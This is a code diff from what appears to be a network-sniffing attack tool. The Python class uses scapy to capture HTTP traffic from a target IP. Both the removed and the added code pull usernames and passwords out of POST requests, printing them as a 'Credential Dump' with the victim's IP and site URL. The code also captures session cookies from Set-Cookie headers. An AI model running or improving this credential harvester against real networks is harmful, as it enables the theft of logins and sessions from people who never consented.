@@ -69,35 +69,7 @@ class Device:
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
                 if "POST" in raw_data or "GET" in raw_data:
-                    login_data = None
-                    password_data = None
-
-                    # Detect login (username, email, phone, user_id, pseudonym)
-                    if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'phone', 'user_id', 'pseudonym']):
-                        for line in raw_data.split('\r\n'):
-                            if '=' in line and len(line) < 100:
-                                if any(k in line.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']):
-                                    login_data = urllib.parse.unquote(line.split('=')[1]).split('/')[0]  # Decode and handle special chars
-
-                    # Detect password (pwd, passwd, heslo)
-                    if any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
-                        for line in raw_data.split('\r\n'):
-                            if '=' in line and len(line) < 100:
-                                if any(k in line.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
-                                    password_data = urllib.parse.unquote(line.split('=')[1]).split('/')[0]  # Decode and handle special chars
-
-                                    # Handle special characters in password by using urllib's unquote to decode them
-                                    if '&' in password_data:
-                                        password_data = password_data.split('&')[0]  # Only take the first part if & is present
-
-                    # If credentials found, print them
-                    if login_data and password_data:
-                        print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    Login: {login_data}{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    PWD: {password_data}{Style.RESET_ALL}")
-
-                    # Print Visited URL
-                    if "GET" in raw_data and "Host:" in raw_data:
+                    if "Host:" in raw_data and "GET" in raw_data:
                         try:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
@@ -106,11 +78,37 @@ class Device:
                         except Exception:
                             pass
 
-                    # Print captured cookies
-                    if "Set-Cookie:" in raw_data:
-                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
-    
+                    if "POST" in raw_data:
+                        # Look for multiple login-related fields (including new ones like 'heslo', 'passwd', 'pwd', etc.)
+                        login_field_keywords = ['username', 'user', 'login', 'email']
+                        password_field_keywords = ['password', 'pass', 'pwd', 'heslo', 'passwd', 'user_id', 'pseudonym', 'phone']
+
+                        login_data = None
+                        password_data = None
+
+                        # Check if the POST data contains a username and password
+                        for line in raw_data.split('\r\n'):
+                            # Looking for login field
+                            for keyword in login_field_keywords:
+                                if keyword in line.lower():
+                                    login_data = line.split('=')[1] if '=' in line else None
+                            # Looking for password field
+                            for keyword in password_field_keywords:
+                                if keyword in line.lower():
+                                    password_data = line.split('=')[1] if '=' in line else None
+
+                        if login_data and password_data:
+                            # Format and print the captured credentials
+                            url = f"http://{host}{path}"
+                            print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
+                            print(f"    IP: {self.targetip} > LOGIN: {login_data} PWD: {password_data} SITE: {url}")
+                            print(f"    CONTENT: raw_username={login_data}&raw_password={password_data}&(place: {path})-(raw ex: submit-button=Login)")
+
+                # Capture cookies if any
+                if "Set-Cookie:" in raw_data:
+                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
